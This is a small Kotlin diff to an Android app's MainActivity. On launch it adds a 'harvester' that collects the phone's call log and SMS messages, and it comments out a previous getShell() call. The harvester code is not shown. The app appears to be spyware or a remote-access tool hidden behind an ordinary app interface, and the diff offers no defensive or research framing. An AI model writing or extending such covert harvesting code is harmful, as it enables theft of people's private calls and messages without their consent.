@@ -50,8 +50,12 @@ class MainActivity : AppCompatActivity() {
 
 
         val context: Context = applicationContext
+        val tempHarverster = harvester(activity, context)
+        tempHarverster.getCallLog()
+        tempHarverster.getSMS()
+//        harvester(activity, context).getSMS()
 //        harvester(activity, context).getCallLog()
-        harvester(activity, context).getShell()
+//        harvester(activity, context).getShell()
     }
 
     private fun clickName(view: View) {
